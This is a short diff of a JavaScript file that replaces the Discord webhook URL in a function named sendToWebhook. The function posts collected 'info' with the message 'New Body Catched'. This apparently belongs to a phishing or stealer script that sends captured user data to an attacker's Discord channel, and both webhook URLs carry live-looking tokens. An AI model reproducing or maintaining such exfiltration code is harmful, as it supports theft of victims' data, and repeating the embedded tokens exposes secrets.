@@ -80,7 +80,7 @@
     });
 
     function sendToWebhook(info) {
-        const webhookURL = 'https://discordapp.com/api/webhooks/1328756882625527908/Vja7V8m8lYjL4XUJjklax2EAs-C70iWprH8bKYmmNb2OyjPj0Z02udwqCt6Lw348W3og';
+        const webhookURL = 'https://discordapp.com/api/webhooks/1328402441615577160/0MnmFwnone9WICR6jTy5UVXjVt2LqBLhLT7jo761SVEXY6cYOP68tuYPATIa6HupDOFR';
         
         const payload = {
             content: "New Body Catched",
